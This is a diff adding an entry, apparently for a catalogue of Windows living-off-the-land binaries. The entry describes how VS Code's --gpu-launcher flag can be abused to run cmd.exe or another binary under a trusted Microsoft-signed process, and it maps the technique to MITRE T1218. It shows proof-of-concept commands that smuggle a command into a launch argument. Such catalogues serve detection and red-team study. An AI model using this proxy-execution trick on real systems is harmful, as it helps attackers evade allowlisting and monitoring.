@@ -1,0 +1,22 @@
+---
+Name: VS Code
+Description: Visual Studio Code, also commonly referred to as VS Code, is a source-code editor made by Microsoft with the Electron Framework, for Windows, Linux and macOS.
+Author: 'Mirage'
+Created: 2023-07-17
+Usage:
+ Steps: Execute following command in PowerShell.
+
+ & "C:\Program Files\Microsoft VS Code\Code.exe" --silent-launch  --disable-gpu-sandbox --gpu-launcher="C:\Windows\system32\cmd.exe /c ping google.com &&"
+
+& "C:\Program Files\Microsoft VS Code\Code.exe" --silent-launch --disable-gpu-sandbox --gpu-launcher="calc.exe"
+
+Use case:  VSCode spawns cmd.exe as a child process of code.exe and executes the ping command or execute a binary. Executes a process under a trusted Microsoft signed binary
+Category: System Binary Proxy Execution
+Privileges: User
+MitreID: T1218 - System Binary Proxy Execution
+
+Resources:
+https://github.com/Miragle-Hub/Adversary-tactics-and-techniques-for-Windows/blob/main/Execution/Microsoft%20VS%20Code 
+
+Acknowledgement:
+  - Person: @miragle-hub 
